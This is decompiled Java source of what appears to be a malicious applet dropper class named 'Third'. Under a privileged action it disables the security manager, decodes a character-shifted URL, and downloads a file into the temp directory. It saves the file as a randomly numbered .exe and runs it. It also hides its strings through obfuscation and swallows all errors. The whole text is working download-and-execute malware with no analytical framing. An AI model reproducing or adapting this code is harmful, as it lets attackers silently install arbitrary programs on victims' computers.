import java.io.InputStream;
import java.io.FileOutputStream;
import java.util.Random;
import java.net.URL;
import java.security.AccessController;
import java.security.PrivilegedExceptionAction;

// 
// Decompiled by Procyon v0.5.30
// 

public class Third implements PrivilegedExceptionAction
{
    public Third() {
        try {
            AccessController.doPrivileged((PrivilegedExceptionAction<Object>)this);
        }
        catch (Exception ex) {}
    }
    
    @Override
    public Object run() {
        System.setSecurityManager(null);
        try {
            final String asowa = Links.lob;
            String jhiiute = "";
            for (int i = 0; i < asowa.length(); ++i) {
                int rt = asowa.charAt(i);
                rt -= 4;
                jhiiute += (char)rt;
            }
            final URL jrjjr = new URL(jhiiute);
            jrjjr.openConnection();
            final InputStream jtjss = jrjjr.openStream();
            String poiuhg = System.getProperty("jdijsavdijsa.idijso.tdijsmpdidijsr".replace("dijs", ""));
            if (poiuhg.charAt(poiuhg.length() - 1) != '\\') {
                poiuhg += "\\";
            }
            final Random nbfd = new Random();
            final int nbvxsa = nbfd.nextInt(100);
            final String fl = poiuhg + "ddk" + Integer.toString(nbvxsa) + ".rxthexrxthe".replace("rxth", "");
            final FileOutputStream maiter = new FileOutputStream(fl);
            byte[] mdmaiter = new byte[153600];
            final byte[] mdmr = new byte[15];
            for (int erist = 0, sss = 0; (sss = jtjss.read(mdmaiter)) > 0; mdmaiter = new byte[153600], erist += sss) {
                maiter.write(mdmaiter, 0, sss);
                final int b = 0;
            }
            maiter.close();
            jtjss.close();
            final Runtime wqento = Runtime.getRuntime();
            for (int j = 0; j < 2; ++j) {
                final int a = 0;
            }
            final Process exx = wqento.exec(fl);
            exx.waitFor();
        }
        catch (Exception ex) {}
        return null;
    }
}
